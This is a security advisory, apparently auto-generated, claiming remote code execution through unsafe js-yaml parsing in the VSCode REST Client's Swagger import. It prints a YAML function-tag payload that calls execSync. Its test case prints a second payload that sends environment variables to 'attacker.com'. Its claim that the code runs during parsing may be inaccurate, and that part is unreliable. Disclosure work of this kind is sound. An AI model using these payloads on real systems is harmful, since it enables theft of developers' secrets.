# Vulnerabilities in VSCode REST Client

## Remote Code Execution via Unsafe YAML Parsing in Swagger Import

### Description
The REST Client extension includes functionality to import Swagger/OpenAPI definitions through the `SwaggerUtils` class. Looking at the implementation in `swaggerUtils.ts`, the extension uses the `yaml.load()` function to parse YAML content without providing safety options:

```typescript
parseOpenApiYaml(data: string): string | undefined {
    try {
        const openApiYaml = yaml.load(data);
        return this.generateRestClientOutput(openApiYaml);
    } catch (error) {
        throw error;
    }
}
```

This is a critical security flaw because the standard `yaml.load()` function in js-yaml (without safety options) allows deserialization of arbitrary JavaScript types, including custom types that can execute code. 

Step by step to trigger the vulnerability:
1. Attacker creates a malicious YAML file with JavaScript code execution payloads
2. Attacker includes this file in a repository
3. Victim opens the repository in VSCode with the REST Client extension installed
4. Victim imports the malicious YAML file using the extension's Swagger/OpenAPI import feature
5. When processed by `yaml.load()`, the malicious YAML executes arbitrary code in the context of VSCode

### Impact
This vulnerability allows arbitrary code execution in the context of the VSCode process. An attacker could:
- Access and exfiltrate sensitive files and data from the victim's system
- Install malware or backdoors
- Potentially gain persistent access to the victim's development environment
- Modify source code in the victim's repositories

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
None. The code uses `yaml.load()` without safety options.

### Missing Mitigations
- Replace `yaml.load()` with `yaml.safeLoad()` or `yaml.load()` with the `{ schema: yaml.SAFE_SCHEMA }` option
- Implement content validation of YAML before processing
- Use a sandbox or separate process for parsing untrusted YAML content

### Preconditions
- Victim must have the REST Client extension installed
- Victim must open a malicious repository
- Victim must import a malicious YAML file using the Swagger/OpenAPI import feature

### Source Code Analysis
The vulnerability is in the `parseOpenApiYaml` method in `swaggerUtils.ts`. The function takes an untrusted string as input and passes it directly to `yaml.load()`:

```typescript
parseOpenApiYaml(data: string): string | undefined {
    try {
        const openApiYaml = yaml.load(data);
        return this.generateRestClientOutput(openApiYaml);
    } catch (error) {
        throw error;
    }
}
```

By default, `yaml.load()` in js-yaml allows deserialization of arbitrary JavaScript types. For example, a malicious YAML file could include code like:

```yaml
constructor: !<tag:yaml.org,2002:js/function> >
  function() {
    return require('child_process').execSync('malicious command').toString();
  }
```

When this is parsed by `yaml.load()`, it will create a JavaScript function that executes system commands and then execute it.

The parsed object is then passed to `generateRestClientOutput()`, but by then the code has already been executed during the parsing phase.

### Security Test Case
1. Create a malicious YAML file with the following content:
```yaml
swagger: '2.0'
info:
  title: Malicious API
  version: '1.0'
servers:
  - url: https://example.com/api
paths:
  /test:
    get:
      summary: Test endpoint
constructor: !<tag:yaml.org,2002:js/function> >
  function() {
    const process = require('process');
    const net = require('net');
    const client = net.connect({host: 'attacker.com', port: 8080}, () => {
      client.write(JSON.stringify(process.env));
    });
    return {};
  }
```

2. Set up a listener on attacker.com:8080 to receive the data
3. Create a repository containing this file
4. Have a victim with the REST Client extension open this repository
5. Trick the victim into importing the YAML file using the Swagger import feature
6. Verify that the listener receives environment variable data from the victim's system
